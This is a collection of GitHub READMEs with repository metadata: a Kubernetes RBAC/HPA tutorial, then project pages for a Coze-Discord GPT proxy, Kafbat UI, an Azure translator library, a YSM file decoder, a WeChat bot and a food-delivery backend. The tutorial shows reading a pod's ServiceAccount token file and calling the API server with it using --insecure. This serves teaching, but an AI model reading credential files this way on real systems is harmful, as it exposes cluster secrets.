  ""sub"": ""system:serviceaccount:default:default""
}
```

We can see the service account default is linked to the namespace where it exists and is using the secret default-token-24pbl. This token is available in the filesystem of each container of the Pod of the attached ServiceAccount.

### Using a Custom ServiceAccount

A Service Account on its own is on not so useful, we need to provide rome rights and permissions to it through a set of rules defined through roles or cluster roles using the RBAC implementation in K8s.  


### RBAC (Role Based Access Control)

RBAC in K8s is activated by default and helps to provide access to resources (objects) like namespaces, pods, services, etc. to those Subjects or Entities like users, group or service accounts who need access to some resources and deny access to other resources who do not need access to them. RBAC increases security in K8s projects and shall be defined through a governance model in each organization (but in the theorie, you know we are all admins ;-)).

RBAC is implemented through Role, ClusterRole, RoleBinding, and ClusterRoleBinding.

#### Role

A Role defines what you or a subject can do to a set of resources, like get, set, delete, etc.A Role contains a set of rules which define a set of permissions. Roles are used to assigning permissions to resources on the namespace level.

#### ClusterRole

Similar to Role, ClusterRole can grant permissions on the Cluster Level such as giving resource permissions across all namespaces in the cluster.

#### RoleBinding and ClusterRoleBinding

RoleBinding and ClusterRoleBinding are used to grant permissions and priviledges to Subjects or Entities on the namespace (project RoleBinding) level or on the cluster level (ClusterRoleBinding).

![RBAC](images/rbac.png ""rbac"")

#### What We’ll Do

We create a new namespace myapp and a new custom ServiceAccount `mysa`, create a new role `podreader` with the permission to get and list pods and create a rolebinding `mypodviewer` to bind the ServiceAccount to the role podreader in the namespace `myapp`.

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k get clusterroles | wc -l
# 62
k get clusterroles
k describe clusterrole view
k describe clusterrole view | grep pods
# the view role allows your application access to many other resources such as deployments and services.
k create namespace myapp
k -n=myapp create serviceaccount mysa
k -n myapp create role podreader --verb=get --verb=list --resource=pods
k -n myapp describe role/podreader
# nice, the role podreader can only view now, but we need to attach the role podreader to our application, represented by the service account myapp. 
k -n myapp create rolebinding mypodviewer --role=podreader --serviceaccount=myapp:mysa
k -n myapp describe rolebindings mypodviewer
k -n myapp auth can-i --as=system:serviceaccount:myapp:mysa list pods
# yes :-)
k -n myapp auth can-i --as=system:serviceaccount:myapp:mysa list services
# no :-)
```
</p>
</details>

We extend our alpine pod with the key `serviceAccountName` and the value `mysa`, apply the change and run a shell in the alpine-pod, get the toke belonging to the `mysa` ServiceAccountand use it to list the pods in the default namespace and the myapp namespace to see the differences:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml

kn myapp
cat alpine-pod-service-account.yaml
k apply -f alpine-pod-service-account.yaml
k describe pod alpine-sa
k get sa
k get secrets
k exec -it alpine-sa -- sh
apk add curl
TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
curl -H ""Authorization: Bearer $TOKEN"" https://node1:6443/api/v1/namespaces/default/pods/ --insecure
curl -H ""Authorization: Bearer $TOKEN"" https://node1:6443/api/v1/namespaces/myapp/pods/ --insecure
# what works, what doesn't work?

```
</p>
</details>

#### Further reading:

[Kubernetes Tips: Using a ServiceAccount](https://medium.com/better-programming/k8s-tips-using-a-serviceaccount-801c433d0023)

#### Permission Manager

--> ToDo

## 3-Tier App (MVC)

Please read the README and the related blog post in the [subfolder](3-tier-app/README.md)  3-tier-app and try to understand and get the todo list app up and running.

# Day 2 Operation

Day 2 operation is mainly about implementing some principles like selfhealing and autoscaling for our apps AND the infrastructure components like nodes and K8s components itself and define resources limits, liveness and readiness probes for our apps, run continious security auditing, apply GitOps principles and style, etc.

In this first section we'll go through app auto scaling with Horizontal Pod Autoscaler.

![hpa](images/pod-autoscaling-hpa.png ""hap"")

## Pod AutoScaling with HPA (Horizontal Pod Autoscaler)

```bash
kubectl run hpa-example --image=k8s.gcr.io/hpa-example --requests=cpu=200m --expose --port=80
# create HPA based on CPU usage
kubectl autoscale deployment hpa-example --cpu-percent=50 --min=1 --max=10
# In another terminal run
kubectl run -i --tty generate-load --image=busybox /bin/sh
# Inside the above container run a loop bash command to stress the CPU
while true; do wget -q -O- http://hpa-example.default.svc.cluster.local; done
# Check HPA Status
kubectl get hpa
```

- [Simplify Kubernetes day 2 ops with Palette Cluster Profiles](https://www.spectrocloud.com/blog/kubernetes-day-2-operations-with-cluster-profiles)

## Labs and exercises and hackaton:

[Labs and exercises and hackaton repo](./Labs-and-exercises/)  to help you learn Kubernetes. 

## GitOps

GitOps is an operating model for Kubernetes and other cloud native technologies. It provides a set of best practices that unifies deployment, management, and monitoring for clusters and applications. Another way to put it is: a path towards a developer experience for managing applications; where end-to-end CI and CD pipelines and Git workflows

- https://www.eksworkshop.com/docs/automation/gitops/

- https://medium.com/@seifeddinerajhi/gitops-ci-cd-automation-workflow-using-github-actions-argocd-and-helm-charts-deployed-on-k8s-3811b253030b


- [Provides our opinionated point of view on how GitOps can be used to manage the infrastructure, services and application layers of K8s based systems](https://github.com/cloud-native-toolkit/multi-tenancy-gitops): GitOps Production Deployment Guide

## TroubleShooting

- [COMMON KUBERNETES ERRORS AND HOW THEY IMPACT CLOUD DEPLOYMENTS](https://cloudtweaks.com/2023/01/common-kubernetes-errors/)

- [Exit Codes In Containers & Kubernetes – The Complete Guide](https://komodor.com/learn/exit-codes-in-containers-and-kubernetes-the-complete-guide/)

- [How to identify and troubleshoot common Kubernetes errors](https://newrelic.com/blog/how-to-relic/monitoring-kubernetes-part-three)

- [Kubernetes Troubleshooting: 5 Common Errors & How to Fix Them](https://lumigo.io/kubernetes-troubleshooting/)

- [Kubernetes Troubleshooting – The Complete Guide](https://komodor.com/learn/kubernetes-troubleshooting-the-complete-guide/)


- [A visual guide on troubleshooting Kubernetes deployments](https://learnk8s.io/troubleshooting-deployments)

- [Kubernetes Troubleshooting: Effective Strategies for Unraveling the Puzzle](https://www.groundcover.com/kubernetes-troubleshooting)


- [node-problem-detector](https://github.com/kubernetes/node-problem-detector): This is a place for various problem detectors running on the Kubernetes nodes.


- [Kubernetes Goat](https://github.com/madhuakula/kubernetes-goat): ""Vulnerable by Design"" cluster environment to learn and practice Kubernetes security using an interactive hands-on playground 🚀

##  Kubernetes in the cloud:

### AWS EKS

- [Terraform module to create AWS Elastic Kubernetes (EKS) resources](https://github.com/terraform-aws-modules/terraform-aws-eks)

- [This project](https://github.com/aws-ia/terraform-aws-eks-blueprints) contains a collection of Amazon EKS cluster patterns implemented in Terraform that demonstrate how fast and easy it is for customers to adopt Amazon EKS. The patterns can be used by AWS customers, partners, and internal AWS teams to configure and manage complete EKS clusters that are fully bootstrapped with the operational software that is needed to deploy and operate workloads.

- [EKS Workshop](https://www.eksworkshop.com/)

- [ (Amazon EKS) Best Practices](https://aws.github.io/aws-eks-best-practices/): A best practices guide for day 2 operations, including operational excellence, security, reliability, performance efficiency, and cost optimization.

- [AWS EKS Kubernetes - Masterclass | DevOps, Microservices](https://github.com/stacksimplify/aws-eks-kubernetes-masterclass)


### Azure AKS

- [Azure AKS Kubernetes Masterclass](https://github.com/stacksimplify/azure-aks-kubernetes-masterclass).

- [Official repository for the AKS Landing Zone Accelerator program](https://github.com/Azure/AKS-Landing-Zone-Accelerator): Azure Landing Zone Accelerators are architectural guidance, reference architecture, reference implementations and automation packaged to deploy workload platforms on Azure at Scale and aligned with industry proven practices.

- [Azure Kubernetes Service Checklist](https://www.the-aks-checklist.com/): This checklist contains a large set of best practices and some of them may not be relevant to your context and thus the rating may be incorrect in your case. Please choose and apply them wisely.


### Google GKE

- [Configures opinionated GKE clusters in terraform](https://github.com/terraform-google-modules/terraform-google-kubernetes-engine)

- [Sample applications for Google Kubernetes Engine (GKE)](https://github.com/GoogleCloudPlatform/kubernetes-engine-samples)


### Common

- [Elastic Cloud on Kubernetes](https://github.com/elastic/cloud-on-k8s): Elastic Cloud on Kubernetes automates the deployment, provisioning, management, and orchestration of Elasticsearch, Kibana, APM Server, Enterprise Search, Beats, Elastic Agent, Elastic Maps Server, and Logstash on Kubernetes based on the operator pattern.


## playgrounds 

- [Kubernetes Playground](https://github.com/netgroup/kubernetes-playground) - Let's play with Kubernetes in a safe sandbox.

- [Gluster file system with Kubernetes](https://github.com/bwolf/gluster-k8s-playground) - Playground to experiment with Gluster and Kubernetes.

- [A standalone Kubernetes cluster](https://github.com/nextbreakpoint/kubernetes-playground)  - Scripts for creating a standalone Kubernetes cluster for development.

- [Playground](https://labs.play-with-k8s.com/) -  Play with Kubernetes is a playground which allows users to run K8s clusters in a matter of seconds.

## CNCF certifications:

- [Kubernetes CKS Full Course](https://www.youtube.com/watch?v=d9xfB5qaOfg) Theory + Practice + Browser Scenarios by Kim Wuestkamp

- [Kubernetes CKS Course Environment](https://github.com/killer-sh/cks-course-environment)

- [Certified Kubernetes Security Specialist - CKS](https://github.com/walidshaari/Certified-Kubernetes-Security-Specialist): Curated resources help you prepare for the CNCF/Linux Foundation CKS 2021 ""Kubernetes Certified Security Specialist"" Certification exam.

- [Kubernetes Certified Administration](https://github.com/walidshaari/Kubernetes-Certified-Administrator): Online resources that will help you prepare for taking the CNCF CKA 2020 ""Kubernetes Certified Administrator"" Certification exam.

- [CKA preparation](https://github.com/alijahnas/CKA-practice-exercises): This is a guide for passing the CNCF Certified Kubernetes Administrator (CKA) with practice exercises.

- [CKA Exercises](https://github.com/chadmcrowell/CKA-Exercises): Practice for the Certified Kubernetes Administrator (CKA) Exam.

## Kubernetes IAC:

Certainly! Here's a list of some popular tools for managing Kubernetes Infrastructure as Code (IAC):

1. **Helm:**
   - Overview: Helm is a package manager for Kubernetes that simplifies the deployment and management of applications.
   - GitHub: [Helm GitHub Repository](https://github.com/helm/helm)

2. **Kustomize:**
   - Overview: Kustomize is a tool for customizing Kubernetes manifests, allowing you to manage configuration variations in a declarative way.
   - GitHub: [Kustomize GitHub Repository](https://github.com/kubernetes-sigs/kustomize)

3. **Kubeconfig Management:**
   - Tools like `kubectx` and `kubens` help manage and switch between multiple Kubernetes contexts and namespaces.
   - GitHub: [kubectx GitHub Repository](https://github.com/ahmetb/kubectx)

4. **Kubeval:**
   - Overview: Kubeval is a tool for validating Kubernetes manifests against the Kubernetes API schema.
   - GitHub: [Kubeval GitHub Repository](https://github.com/instrumenta/kubeval)

5. **Kops:**
   - Overview: Kops helps you create, destroy, upgrade, and maintain Kubernetes clusters on AWS.
   - GitHub: [Kops GitHub Repository](https://github.com/kubernetes/kops)

6. **Terraform:**
   - Overview: While not specific to Kubernetes, Terraform is widely used for IAC and can be used to provision and manage Kubernetes infrastructure.
   - Website: [Terraform](https://www.terraform.io/)

7. **Pulumi:**
   - Overview: Pulumi allows you to define infrastructure as code using familiar programming languages, including TypeScript, Python, and Go.
   - GitHub: [Pulumi GitHub Repository](https://github.com/pulumi/pulumi)

8. **Helmfile:**
   - Overview: Declaratively deploy your Kubernetes manifests, Kustomize configs, and Charts as Helm releases. Generate all-in-one manifests for use with ArgoCD.
   - GitHub: [Kubeform GitHub Repository](https://github.com/helmfile/helmfile)

9. **Jsonnet:**
   - Overview: Jsonnet is a data templating language that can be used to generate Kubernetes manifests.
   - GitHub: [Jsonnet GitHub Repository](https://github.com/google/jsonnet)

10. **Skaffold:**
    - Overview: Skaffold is a command-line tool that facilitates continuous development for Kubernetes applications.
    - GitHub: [Skaffold GitHub Repository](https://github.com/GoogleContainerTools/skaffold)

This is not an exhaustive list, and the choice of tools depends on your specific use case and preferences. Always check the official documentation and community support for each tool for the most accurate and up-to-date information.

### Coming next

* Cluster Operation and maintanance

* Nodes AutoScaling and AutoSpotting (on AWS)

* Logging and Monitoring with Operators

* Cloud Native Storage for Statefulsets

* Backup & Recovery

* Service Mesh


## ❤ Show your support

Give a ⭐️ if this project helped you, Happy learning!
",0,0,76,apache-2.0,41.0
oddfar/coze-discord,master,"
<p align=""center""><a href=""https://oddfar.com/"" target=""_blank"" rel=""noopener noreferrer""><img width=""180"" src=""https://note.oddfar.com/img/web.png"" alt=""logo""></a></p>

<p align=""center"">
  <a href=""https://github.com/oddfar/coze-discord/stargazers""><img src=""https://img.shields.io/github/stars/oddfar/coze-discord.svg""></a>
	<a href=""https://github.com/oddfar/coze-discord/blob/master/LICENSE""><img src=""https://img.shields.io/github/license/oddfar/coze-discord.svg""></a>
</p>


<p align=""center"">使用两个Discord机器人代理Coze服务，免费使用GPT-4高级模型的API功能</p>

<h2 align=""center"">coze-discord</h2>

## 介绍

**项目已失效，仅供学习**

简介：Coze 的机器人集成了 GPT-4 等模型，并可以发布 Discord 等平台。Discord 机器人能够发送和接收消息，我们使用了两个机器人：一个与 Coze 机器人进行绑定的应用，另一个负责向 Coze 机器人发送消息和获取消息。通过这种方式，我们可以免费使用 GPT-4，并拓展 API 等其他功能。

功能如下：

- [x] 支持 api 方式调用
- [x] 对话支持流式返回
- [x] 支持对话指定 `Discord` 频道、子频道，实现对话隔离支
- [x] 支持创建 `Discord` 频道、子频道、线程
- [x] 对话支持文生图

未来计划：

- [ ] <s>对话支持图生文</s>
- [ ] <s>支持和 `openai` 的对话接口、GPT4V识图接口...</s>
- [ ] <s>支持配置多个机器人</s>

若您有好的想法，发现一些 **BUG** 并修复了，欢迎提交 **Pull Request** 参与开源贡献

## 使用教程

使用教程：<https://oddfar.github.io/campus-doc/pages/b31421/>

部署教程：<https://oddfar.github.io/campus-doc/pages/60eaa2/>

> 平台

Coze: <https://www.coze.com/>

Discord Api: <https://discord.com/developers/docs/intro>

Discord SDK JDA: <https://jda.wiki/>



## 演示图

![image-20240201225345802](https://gcore.jsdelivr.net/gh/oddfar/static/discord/01.介绍.assets/image-20240201225345802.png)

![image-20240201225419850](https://gcore.jsdelivr.net/gh/oddfar/static/discord/01.介绍.assets/image-20240201225419850.png)

![image-20240202153712692](https://gcore.jsdelivr.net/gh/oddfar/static/discord/01.介绍.assets/image-20240202153712692.png)

## 鸣谢

感谢以下项目的开源的付出：

- coze-discord-proxy

  GO版本：https://github.com/deanxv/coze-discord-proxy/

",1,4,1,mit,1.0
kafbat/kafka-ui,main,"<div align=""center"">
<img src=""documentation/images/logo_new.png"" alt=""logo""/>
<h3>Kafbat UI</h3>

Versatile, fast and lightweight web UI for managing Apache Kafka® clusters.
</div>

<div align=""center"">
<a href=""https://github.com/kafbat/kafka-ui/blob/main/LICENSE""><img src=""https://img.shields.io/badge/License-Apache%202.0-blue.svg"" alt=""License""/></a>
<img src=""documentation/images/free-open-source.svg"" alt=""price free""/>
<a href=""https://github.com/kafbat/kafka-ui/releases""><img src=""https://img.shields.io/github/v/release/kafbat/kafka-ui"" alt=""latest release version""/></a>
<a href=""https://discord.gg/4DWzD7pGE5""><img src=""https://img.shields.io/discord/897805035122077716"" alt=""discord online number count""/></a>
<a href=""https://github.com/sponsors/kafbat""><img src=""https://img.shields.io/github/sponsors/kafbat?style=flat&logo=githubsponsors&logoColor=%23EA4AAA&label=Support%20us"" alt="""" /></a>
</div>

<p align=""center"">
    <a href=""https://ui.docs.kafbat.io/"">Documentation</a> • 
    <a href=""https://ui.docs.kafbat.io/configuration/quick-start"">Quick Start</a> • 
    <a href=""https://discord.gg/4DWzD7pGE5"">Community</a>
    <br/>
    <a href=""https://aws.amazon.com/marketplace/pp/{replaceMe}"">AWS Marketplace</a>  •
    <a href=""https://www.producthunt.com/products/ui-for-apache-kafka/reviews/new"">ProductHunt</a>
</p>

<p align=""center"">
  <img src=""https://repobeats.axiom.co/api/embed/88d2bd9887380c7d86e2f986725d9af52ebad7f4.svg"" alt=""stats""/>
</p>

#### Kafbat UI is a free, open-source web UI to monitor and manage Apache Kafka clusters.

Kafbat UI is a simple tool that makes your data flows observable, helps find and troubleshoot issues faster and deliver optimal performance. Its lightweight dashboard makes it easy to track key metrics of your Kafka clusters - Brokers, Topics, Partitions, Production, and Consumption.

<i>
Kafbat UI, developed by <b>Kafbat</b>*, proudly carries forward the legacy of the UI Apache Kafka project.
Our dedication is reflected in the continuous evolution of the project, ensuring adherence to its foundational vision while adapting to meet modern demands.
We extend our gratitude to Provectus for their past support in groundbreaking work, which serves as a cornerstone for our ongoing innovation and dedication.

<b>*</b> - The <b>Kafbat</b> team comprises key contributors from the project's inception, bringing a wealth of experience and insight to this renewed endeavor.
</i>

# Interface

![Interface](https://raw.githubusercontent.com/kafbat/kafka-ui/images/overview.gif)

# Features
* **Multi-Cluster Management** — monitor and manage all your clusters in one place
* **Performance Monitoring with Metrics Dashboard** —  track key Kafka metrics with a lightweight dashboard
* **View Kafka Brokers** — view topic and partition assignments, controller status
* **View Kafka Topics** — view partition count, replication status, and custom configuration
* **View Consumer Groups** — view per-partition parked offsets, combined and per-partition lag
* **Browse Messages** — browse messages with JSON, plain text, and Avro encoding
* **Dynamic Topic Configuration** — create and configure new topics with dynamic configuration
* **Configurable Authentification** — [secure](https://ui.docs.kafbat.io/configuration/authentication) your installation with optional Github/Gitlab/Google OAuth 2.0
* **Custom serialization/deserialization plugins** - [use](https://ui.docs.kafbat.io/configuration/serialization-serde) a ready-to-go serde for your data like AWS Glue or Smile, or code your own!
* **Role based access control** - [manage permissions](https://ui.docs.kafbat.io/configuration/rbac-role-based-access-control) to access the UI with granular precision
* **Data masking** - [obfuscate](https://ui.docs.kafbat.io/configuration/data-masking) sensitive data in topic messages

## Feature overview

<details>
    <summary>Click here for the feature overview</summary>

# The Interface
Kafbat UI wraps major functions of Apache Kafka with an intuitive user interface.

![Interface](documentation/images/Interface.gif)

## Topics
Kafbat UI makes it easy for you to create topics in your browser by several clicks,
pasting your own parameters, and viewing topics in the list.

![Create Topic](documentation/images/Create_topic_kafka-ui.gif)

It's possible to jump from connectors view to corresponding topics and from a topic to consumers (back and forth) for more convenient navigation.
connectors, overview topic settings.

![Connector_Topic_Consumer](documentation/images/Connector_Topic_Consumer.gif)

### Messages
Let's say we want to produce messages for our topic. With the Kafbat UI we can send or write data/messages to the Kafka topics without effort by specifying parameters, and viewing messages in the list.

![Produce Message](documentation/images/Create_message_kafka-ui.gif)

## Schema registry
There are 3 supported types of schemas: Avro®, JSON Schema, and Protobuf schemas.

![Create Schema Registry](documentation/images/Create_schema.gif)

Before producing avro/protobuf encoded messages, you have to add a schema for the topic in Schema Registry. Now all these steps are easy to do
with a few clicks in a user-friendly interface.

![Avro Schema Topic](documentation/images/Schema_Topic.gif)

</details>

# Getting Started

To run Kafbat UI, you can use either a pre-built Docker image or build it (or a jar file) yourself.

## Quick start (Demo run)

```
docker run -it -p 8080:8080 -e DYNAMIC_CONFIG_ENABLED=true ghcr.io/kafbat/kafka-ui
```

Then access the web UI at [http://localhost:8080](http://localhost:8080)

The command is sufficient to try things out. When you're done trying things out, you can proceed with a [persistent installation](https://ui.docs.kafbat.io/quick-start/persistent-start)

## Persistent installation

```
services:
  kafbat-ui:
    container_name: kafbat-ui
    image: ghcr.io/kafbat/kafka-ui:latest
    ports:
      - 8080:8080
    environment:
      DYNAMIC_CONFIG_ENABLED: 'true'
    volumes:
      - ~/kui/config.yml:/etc/kafkaui/dynamic_config.yaml
```

Please refer to our [configuration](https://ui.docs.kafbat.io/configuration/configuration-file) page to proceed with further app configuration.

## Some useful configuration related links

[Web UI Cluster Configuration Wizard](https://ui.docs.kafbat.io/configuration/configuration-wizard)

[Configuration file explanation](https://ui.docs.kafbat.io/configuration/configuration-file)

[Docker Compose examples](https://ui.docs.kafbat.io/configuration/compose-examples)

[Misc configuration properties](https://ui.docs.kafbat.io/configuration/misc-configuration-properties)

## Helm charts

[Quick start](https://ui.docs.kafbat.io/configuration/helm-charts/quick-start)

## Building from sources

[Quick start](https://ui.docs.kafbat.io/development/building/prerequisites) with building

## Liveliness and readiness probes
Liveliness and readiness endpoint is at `/actuator/health`.<br/>
Info endpoint (build info) is located at `/actuator/info`.

# Configuration options

All the environment variables/config properties could be found [here](https://ui.docs.kafbat.io/configuration/misc-configuration-properties).

# Contributing

Please refer to [contributing guide](https://ui.docs.kafbat.io/development/contributing), we'll guide you from there.

# Support

As we're fully independent, team members contribute in their free time.
Your support is crucial for us, if you wish to sponsor us, take a look [here](https://github.com/sponsors/kafbat) 
",1,137,51,apache-2.0,180.0
brenoepics/at4j,main,"# Azure Translator for Java (AT4J)

[![Maven Central](https://img.shields.io/maven-central/v/io.github.brenoepics/at4j?color=blue)](https://central.sonatype.com/artifact/io.github.brenoepics/at4j)
![Static Badge](https://img.shields.io/badge/azure--api-3.0-blue?style=flat&logo=microsoftazure&logoColor=%230080FF&color=%230080FF&link=https%3A%2F%2Flearn.microsoft.com%2Fen-us%2Fazure%2Fai-services%2Ftranslator%2Freference%2Fv3-0-reference)
[![Static Badge](https://img.shields.io/badge/run-l?logo=postman&label=Postman&color=EF5B25)](https://www.postman.com/maintenance-astronaut-2993290/workspace/brenoepics/collection/18589822-dfe7a640-9b94-47a8-b19f-46cb9cc8843e?action=share&creator=18589822)
[![Coverage](https://sonarcloud.io/api/project_badges/measure?project=brenoepics_at4j&metric=coverage)](https://sonarcloud.io/summary/new_code?id=brenoepics_at4j)
[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=brenoepics_at4j&metric=alert_status)](https://sonarcloud.io/summary/new_code?id=brenoepics_at4j)

An unofficial Java library for translating text using Azure AI Cognitive Services.

## ✨ Features

- Text Translation: Translate text from one language (or detect) to another or to a list of languages.
- Language Detection: Detect the language of a given text.
- Profanity Handling: Options for handling profanity in translations.
- Text Type Support: We support both plain text and HTML text translation.
- And more.

## 📝 Documentation

- [AT4J Docs](https://brenoepics.github.io/at4j/)
- [JavaDoc](https://brenoepics.github.io/at4j/javadoc/)

## 🎉 Basic Usage

> [!NOTE]
> Example repository [Azure-Translator-Example](https://github.com/brenoepics/Azure-Translator-Example)

The following example translates a simple Hello World to Portuguese, Spanish and French.

```java
public class ExampleTranslator {
  public static void main(String[] args) {
    // Insert your Azure key and region here
    String azureKey = ""<Your Azure Subscription Key>"";
    String azureRegion = ""<Your Azure Subscription Region>"";
    AzureApi api = new AzureApiBuilder().setKey(azureKey).region(azureRegion).build();

    // Set up translation parameters
    List < String > targetLanguages = List.of(""pt"", ""es"", ""fr"");
    TranslateParams params =
            new TranslateParams(""Hello World!"", targetLanguages).setSourceLanguage(""en"");

    // Translate the text
    Optional < TranslationResponse > translationResult = api.translate(params).join();

    // Print the translations
    translationResult.ifPresent(
            response ->
                    response.getFirstResult().getTranslations().forEach(ExampleTranslator::logLanguage));
  }

  public static void logLanguage(Translation translation) {
    System.out.println(translation.getLanguageCode() + "": "" + translation.getText());
  }
}
```

<details>
     <summary>Expected Output</summary>

```console
pt: Olá, Mundo!
es: ¡Hola mundo!
fr: Salut tout le monde!
```

</details>

## 📦 Download / Installation

The recommended way to get AT4J is to use a build manager, like Gradle or Maven.

### [AT4J Dependency](https://central.sonatype.com/artifact/io.github.brenoepics/at4j)

<details>
  <summary>Gradle</summary>

```gradle
implementation group: 'io.github.brenoepics', name: 'at4j', version: '1.2.0'
```

</details>
<details>
  <summary>Maven</summary>

```xml

<dependency>
    <groupId>io.github.brenoepics</groupId>
    <artifactId>at4j</artifactId>
    <version>1.2.0</version>
</dependency>
```

</details>
<details>
  <summary>Sbt</summary>

```sbt
libraryDependencies += ""io.github.brenoepics"" % ""at4j"" % ""1.2.0""
```

</details>

### Frequently Asked Questions (FAQ)

**Q:** How do I access Azure Translator Keys for my project?

**A:** You can access your Azure Translator Keys through your Azure portal. Remember to keep your keys secure and
refrain from sharing them publicly. If you suspect a key has been compromised, it's crucial to regenerate it promptly.
For detailed instructions on generating your own keys, refer
to [this guide](https://brenoepics.github.io/at4j/guide/azure-subscription.html#azure-subscription). Additionally, you
can explore the [Azure Free Tier](https://brenoepics.github.io/at4j/guide/azure-subscription.html#azure-free-tier) for
more information.

## 🤝 Thank You!

- **Microsoft Azure**: Supporting our project with a generous grant of $10,000+ in Azure credits, enabling us to use
  virtual machines, document translation and other essential cloud resources for our development needs.
- We extend our sincere thanks to all contributors for their invaluable contributions.

## 🧑‍💻 Contributing

Contributions of any kind are welcome. You can start contributing to this library by creating issues, submitting pull
requests or giving a star to the project.

## 📃 License

AT4J is distributed under the [Apache license version 2.0](./LICENSE).
",4,2,8,apache-2.0,48.0
XiYang6666/YSM-Decoder,master,"# YSM-Decoder

解码ysm文件的Java CLI工具

> [!IMPORTANT]  
> 该工具仅用于学习, 请勿滥用.

## 注意

由于部分使用者贴脸开大的原因, 本项目将不再维护.

## 支持版本

仅支持 Yes Steve Model 1.2.0 以下加密版本为 1 或 2 的 ysm 文件的解码.

## 使用

```bash
java -jar YSM-Decoder-<version>.jar -i <input_file_path> -o <output_dir_path>
```
",2,0,1,mit,0.0
meteorOSS/wechat-bc,master,"
> 我是一名即将毕业的应届生，对计算机和Java后端开发充满热情。
> 现在正在寻找实习工作，如果有符合的岗位招聘，希望能考虑一下我! 微信 zhengsenhe0758

# WeChatBc

> 类似开发公众号一样，开发个人微信号

采用了类似Bukkit的插件化框架设计，基于wechatbc独立且呼吸顺畅的开发扩展模块 ⭐

![image](https://github.com/meteorOSS/WeChatBc/assets/61687266/86f34b62-5f5b-4a3d-a3cc-cc151606b495)

![image](https://github.com/meteorOSS/WeChatBc/assets/61687266/dc4bce02-e5c2-416f-9f90-312f1004b9b0)

(图片效果需安装 [WeChatSetu插件](https://github.com/meteorOSS/WeChatSetu) )

![image](https://github.com/meteorOSS/wechat-bc/assets/61687266/a5cde024-318d-4c04-b87b-7f56bc7fafa3)

## 支持功能

* 消息回复(好友，群组),文本,视频,文件,语音发送
* 获取用户信息，设置备注，添加好友....
* API简单易用。使用java编写扩展插件，打包以jar载入运行 详见 [编写wechatbc插件](https://github.com/meteorOSS/WeChatBc/wiki/%E7%BC%96%E5%86%99WeChatBc%E6%8F%92%E4%BB%B6)
* 文档 [WeChatBc-WIKI](https://github.com/meteorOSS/WeChatBc/wiki)

## 插件资源

[📌 WeChatSetu: 让机器人随机发送""小姐姐跳舞视频"";爬取pixiv图片](https://github.com/meteorOSS/WeChatSetu)

[📌 chatgpt: 接入chatgpt](https://github.com/meteorOSS/wechat-gpt)

[📌 revoke-listener: 防消息撤回](https://github.com/meteorOSS/revoke-listener)

[📌 wechat-pay: 收款码收款回调](https://github.com/meteorOSS/wechat-pay)

你可以在 https://github.com/meteorOSS/wechat-bc/issues/28 分享你编写的插件，我会把它们更新到这里

## 安装

详见 [启动WeChatBc](https://github.com/meteorOSS/WeChatBc/wiki/%E5%90%AF%E5%8A%A8WeChatBc)

## Thanks

> **[Bukkit框架](https://github.com/Bukkit/Bukkit)** 事件分发，插件管理等模式深受该项目影响

> **[Jkook](https://github.com/SNWCreations/JKook)** 最初是因为该项目萌生了用java写一个微信客户端实现的想法

> **[itchat](https://github.com/littlecodersh/itchat)** 调试微信接口时参考的项目，感谢前辈的付出


如今微信在当代社交生活中已然成为不可或缺的一环。本项目最初诞生于一个简单的愿景：

通过个人微信号，将用户与智能家居设备、快递查询服务以及日常事务通知等功能紧密连接。

目标不仅仅是简化操作流程，而是在于打造一个更加高效、便捷的生活方式

如果这一切能够为你的生活带来哪怕是微小的便捷与改变，对我而言，便是莫大的荣誉和满足

## 贡献

欢迎fork后提交pr，冲突解决需要花费很多时间，请在同步源仓库最新代码后进行提交


## ⭐使用中的任何问题欢迎提交issue或加入Q群653440235反馈

本项目仅供学习使用，一切使用本项目造成的后果，开发者概不负责

[![wechatbc](https://api.star-history.com/svg?repos=meteorOSS/wechat-bc&type=Date)](https://star-history.com/#meteorOSS/wechat-bc&Date)




















",20,12,7,mit,4.0
Missuo0o/FoodDeliveryBackend,main,"# Food Delivery Backend System

This is the backend system for a food delivery application, built using Spring Boot. The application leverages a range of technologies including MySQL, Redis, RabbitMQ, and integrates with Alibaba Cloud's OSS and WeChat Pay. This system is designed to be scalable, secure, and efficient, utilizing Spring Boot's extensive support for enterprise-grade applications.

## Configuration

The application is configured to run on port 8080 and is set up with production profiles. It uses MyBatis for ORM, JWT for authentication, and includes advanced logging configurations.

### Technologies Used

- **Spring Boot** - Framework for building Java-based applications.
- **MySQL** - Database for storing user and order data.
- **Redis** - Used as a cache and session store.
- **RabbitMQ** - Messaging broker for handling asynchronous processing.
- **JWT** - For securing REST APIs by providing tokens to verify user identity.
- **MyBatis** - Persistence framework integrating with Spring Boot for data handling.
- **Knife4j** - Enhanced Swagger-compatible interface for visualizing RESTful APIs.
- **Alibaba Cloud OSS** - For storage solutions.
- **WeChat Pay** - Payment integration for handling transactions and refunds.

## Installation

### Prerequisites

You need the following installed on your system:

- Java JDK 23
- Maven
- MySQL
- RabbitMQ
- Redis

### Setup

1. Clone the repository:

   ```bash
   git clone https://github.com/yourusername/food-delivery-backend.git
   ```

2. Navigate to the project directory:

   ```bash
   cd food-delivery-backend
   ```

3. Install dependencies:

   ```bash
   mvn install
   ```

### Configuration

Update the `application.yml` or `application.properties` with your specific settings for MySQL, Redis, RabbitMQ, OSS, and WeChat Pay. This typically includes hosts, ports, usernames, passwords, and other essential configuration details.

Certainly! Here's the section of the README updated to reflect how to run the application using the `java -jar` command instead of Maven directly:

---

## Running the Application

Instead of using Maven to run the application, you can build a jar file and run it directly using the Java command. This is often more suitable for production environments or when deploying the application.

1. First, package the application into a runnable jar file with Maven:

   ```bash
   mvn clean package
   ```

   This command will create a `.jar` file in the `target` directory.

2. Run the application using:

   ```bash
   java -jar target/your-application-name.jar
   ```

   Replace `your-application-name.jar` with the actual name of your jar file generated by Maven.

The application will start running on `http://localhost:8080`.

---

## API Documentation

API documentation is available via Swagger UI and Knife4j at:

- **Swagger UI**: [http://localhost:8080/swagger-ui.html](http://localhost:8080/swagger-ui.html)
- **Knife4j**: [http://localhost:8080/doc.html](http://localhost:8080/doc.html)

## Security

This application uses JWT for authentication. Ensure you configure your JWT settings properly, including secret keys and token names for both admin and user levels.

## Contributing

We appreciate contributions. Please follow the standard GitHub fork-and-pull-request workflow.

## License

This project is licensed under the MIT License - see the LICENSE.md file for details.

---

